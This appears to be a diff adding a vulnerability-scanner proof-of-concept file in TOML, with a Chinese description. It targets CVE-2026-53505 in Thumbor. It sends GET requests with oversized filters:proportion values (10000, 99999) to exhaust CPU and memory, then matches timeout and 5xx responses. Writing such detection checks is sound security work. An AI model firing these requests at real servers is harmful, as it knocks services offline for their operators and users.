@@ -1,0 +1,54 @@
+[info]
+author = "AVE"
+description = "检测 Thumbor 服务的 filters:proportion 过滤器是否存在未限制上界的远程拒绝服务漏洞。通过发送超大 proportion 值（如 10000）触发图片引擎无限制缩放，导致 CPU/内存耗尽。"
+id = "POC-AVE-2026-0770"
+name = "CVE-2026-53505 Thumbor proportion filter DoS PoC"
+severity = "high"
+tags = [
+    "cve-2026-53505",
+    "dos",
+    "thumbor",
+]
+vuln_id = [
+    "CVE-2026-53505",
+    "AVE-2026-0770",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/unsafe/100x100/filters:proportion(10000)/https://example.com/test.jpg"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "reset",
+    "refused",
+    "Service Unavailable",
+    "502",
+    "503",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/unsafe/100x100/filters:proportion(99999)/https://example.com/test.jpg"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "timeout",
+    "reset",
+    "refused",
+    "Service Unavailable",
+    "502",
+    "503",
+]
